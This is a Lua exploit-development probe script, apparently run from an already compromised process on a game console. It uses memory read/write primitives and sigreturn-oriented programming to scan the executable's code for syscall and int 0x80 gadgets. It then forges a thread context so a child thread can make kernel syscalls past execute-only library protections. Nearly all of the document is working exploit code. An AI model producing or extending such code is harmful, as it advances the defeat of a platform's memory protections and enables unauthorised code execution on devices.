-- CRASH_CLASS: LOW
-- PROBE 155a: Search eboot .text for syscall (0F 05) instruction
--
-- We need a syscall instruction in eboot (RX) for child threads to call
-- kernel syscalls. libc is XO (execute-only) and children can't reach it.
-- This probe searches eboot .text byte-by-byte for 0F 05 sequences.

print("=== PROBE 155a: EBOOT SYSCALL SEARCH ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = to_num(memory.read_dword(info + 0x108))
local text_hi = to_num(memory.read_dword(info + 0x10C))
local text_sz_lo = to_num(memory.read_dword(info + 0x110))
local text_sz_hi = to_num(memory.read_dword(info + 0x114))
local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("eboot=0x" .. string.format("%X%08X", text_hi, text_lo))
print("text_size=0x" .. string.format("%X%08X", text_sz_hi, text_sz_lo))

-- SROP setup for child thread test
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("libc_sc_addr=0x" .. string.format("%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- [A] Search for 0F 05 (syscall) in eboot .text
-- Read in dword chunks, check each byte pair
print("")
print("--- [A] SYSCALL INSTRUCTION SEARCH ---")

local found = {}
local last_readable = 0
local max_search = 0x500000  -- 5MB

-- Read dwords and check for 0F 05 within each
for off = 0, max_search - 4, 4 do
    local ok, val = pcall(function() return memory.read_dword(eboot + off) end)
    if not ok then
        if last_readable > 0 then
            print("text_end=0x" .. string.format("%X", off))
            break
        end
    else
        last_readable = off
        local v = to_num(val)
        local b0 = v % 256
        local b1 = math.floor(v / 256) % 256
        local b2 = math.floor(v / 65536) % 256
        local b3 = math.floor(v / 16777216) % 256

        -- Check byte pairs: (b0,b1), (b1,b2), (b2,b3)
        if b0 == 0x0F and b1 == 0x05 then
            found[#found + 1] = off
        end
        if b1 == 0x0F and b2 == 0x05 then
            found[#found + 1] = off + 1
        end
        if b2 == 0x0F and b3 == 0x05 then
            found[#found + 1] = off + 2
        end
    end

    -- Cross dword boundary: check (b3 of this, b0 of next)
    if ok and off + 4 <= max_search - 4 then
        local v = to_num(val)
        local b3 = math.floor(v / 16777216) % 256
        if b3 == 0x0F then
            local ok2, val2 = pcall(function() return memory.read_dword(eboot + off + 4) end)
            if ok2 then
                local nb0 = to_num(val2) % 256
                if nb0 == 0x05 then
                    found[#found + 1] = off + 3
                end
            end
        end
    end

    if off % 0x100000 == 0 and off > 0 then
        print("  scanned 0x" .. string.format("%X", off) .. " found=" .. #found)
    end
end

print("total_syscall_instructions=" .. #found)
print("last_readable_offset=0x" .. string.format("%X", last_readable))

-- Print first 20 hits with context
for i = 1, math.min(20, #found) do
    local off = found[i]
    -- Read surrounding bytes for context
    local ok1, pre = pcall(function() return memory.read_dword(eboot + off - 2) end)
    local ok2, post = pcall(function() return memory.read_dword(eboot + off + 2) end)
    local pre_str = ok1 and string.format("%08X", to_num(pre)) or "????????"
    local post_str = ok2 and string.format("%08X", to_num(post)) or "????????"

    -- Check what comes after syscall
    local after = ""
    if ok2 then
        local pb = to_num(post)
        local a0 = pb % 256
        if a0 == 0xC3 then after = "ret"
        elseif a0 == 0x72 then after = "jc"
        elseif a0 == 0x73 then after = "jnc"
        elseif a0 == 0x48 then after = "rex.w"
        elseif a0 == 0x90 then after = "nop"
        elseif a0 == 0xEB then after = "jmp"
        else after = string.format("0x%02X", a0)
        end
    end

    print(string.format("  [%d] +0x%06X  pre=%s  post=%s  after=%s",
        i, off, pre_str, post_str, after))
end

-- [B] Also search for int 0x80 (CD 80) — 32-bit syscall interface
print("")
print("--- [B] INT 0x80 SEARCH ---")
local int80 = {}
for off = 0, math.min(last_readable, max_search - 4), 4 do
    local ok, val = pcall(function() return memory.read_dword(eboot + off) end)
    if ok then
        local v = to_num(val)
        local b0 = v % 256
        local b1 = math.floor(v / 256) % 256
        local b2 = math.floor(v / 65536) % 256
        local b3 = math.floor(v / 16777216) % 256
        if b0 == 0xCD and b1 == 0x80 then int80[#int80 + 1] = off end
        if b1 == 0xCD and b2 == 0x80 then int80[#int80 + 1] = off + 1 end
        if b2 == 0xCD and b3 == 0x80 then int80[#int80 + 1] = off + 2 end
    end
end
print("total_int80=" .. #int80)
for i = 1, math.min(10, #int80) do
    print(string.format("  [%d] +0x%06X", i, int80[i]))
end

-- [C] If we found syscall instructions, test child thread with the first one
if #found > 0 then
    print("")
    print("--- [C] CHILD THREAD TEST WITH EBOOT SYSCALL ---")

    -- Find a syscall followed by ret or jnc/nop/etc
    local best = nil
    for i = 1, #found do
        local off = found[i]
        local ok2, post = pcall(function() return memory.read_dword(eboot + off + 2) end)
        if ok2 then
            local pb = to_num(post)
            local a0 = pb % 256
            -- Prefer: ret (C3), jc+ret, jnc+ret
            if a0 == 0xC3 then
                best = off
                print("BEST: syscall;ret at +" .. string.format("%06X", off))
                break
            end
        end
    end

    if not best then
        -- No syscall;ret found. Try first syscall and see what follows
        best = found[1]
        print("Using first syscall at +" .. string.format("%06X", best))
    end

    local sc_eboot = uint64(string.format("0x%X%08X", text_hi, text_lo + best))
    print("eboot_sc=0x" .. string.format("%X%08X", text_hi, text_lo + best))

    -- mov [rdi], rax; ret gadget
    local store_gadget = uint64(string.format("0x%X%08X", text_hi, text_lo + 0xD0B60))
    local ret_gadget = uint64(string.format("0x%X%08X", text_hi, text_lo + 0x42))

    -- Test: child calls getpid(20) via eboot syscall, stores result
    local RESULT = gpu + 0x20000
    wq(RESULT, uint64("0xDEADDEADDEADDEAD"))

    -- Child stack
    wq(gpu + 0x30F00, store_gadget)  -- after syscall return, store RAX
    wq(gpu + 0x30F08, ret_gadget)    -- then spin

    -- Build ucontext
    local uctx = gpu + 0x40000
    for off = 0, 0x4BF, 8 do wq(uctx + off, uint64(0)) end
    wd(uctx + 0x108, 0x480)
    wd(uctx + 0x0D0, 7)
    wd(uctx + 0x110, 0x10000)
    wd(uctx + 0x0C0, 0x43)
    wd(uctx + 0x100, 0x3B)
    wq(uctx + 0x0E0, sc_eboot)       -- RIP = eboot syscall instruction
    wq(uctx + 0x0F8, ga(0x30F00))    -- RSP
    wq(uctx + 0x078, uint64(20))     -- RAX = SYS_getpid
    wq(uctx + 0x048, ga(0x20000))    -- RDI = result addr

    local sc_tc = make_syscall(430)
    local tidp = gpu + 0x50000
    wq(tidp, uint64(0))
    local tc_ok = pcall(function() return sc_tc(uint64(uctx), tidp) end)
    local tid = rd(tidp)
    print("child_tid=" .. tid .. " create=" .. tostring(tc_ok))

    -- Wait
    for i = 1, 200 do srop(20) end

    local res = memory.read_qword(RESULT)
    local resh, resl = get_hi_lo(res)
    print("child_result=0x" .. string.format("%X%08X", resh, resl))

    if resl == pid and resh == 0 then
        print("*** CHILD CAN CALL SYSCALL FROM EBOOT ***")
    elseif resl > 0 and resl < 0x10000 and resh == 0 then
        print("*** CHILD RETURNED " .. resl .. " (might be pid or status) ***")
    elseif resh == 0xDEADDEAD then
        print("child did not write (crashed or didn't reach store)")

        -- Try with the libc instruction after carry flag check
        -- Maybe the issue was the carry flag? Set RFLAGS to clear CF
        print("Retrying with CF cleared in RFLAGS...")
        wq(RESULT, uint64("0xDEADDEADDEADDEAD"))
        for off = 0, 0x4BF, 8 do wq(uctx + off, uint64(0)) end
        wd(uctx + 0x108, 0x480)
        wd(uctx + 0x0D0, 7)
        wd(uctx + 0x110, 0x10000)
        wd(uctx + 0x0C0, 0x43)
        wd(uctx + 0x100, 0x3B)
        wq(uctx + 0x0E0, sc_eboot)
        wq(uctx + 0x0F8, ga(0x30F00))
        wq(uctx + 0x078, uint64(20))
        wq(uctx + 0x048, ga(0x20000))
        -- Set RFLAGS at +0x0E8 (after RIP at +0xE0): clear CF (bit 0), set IF (bit 9)
        wq(uctx + 0x0E8, uint64(0x202))  -- IF=1, all others clear

        wq(tidp, uint64(0))
        pcall(function() return sc_tc(uint64(uctx), tidp) end)
        tid = rd(tidp)
        for i = 1, 200 do srop(20) end
        res = memory.read_qword(RESULT)
        resh, resl = get_hi_lo(res)
        print("retry_result=0x" .. string.format("%X%08X", resh, resl))
    end
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
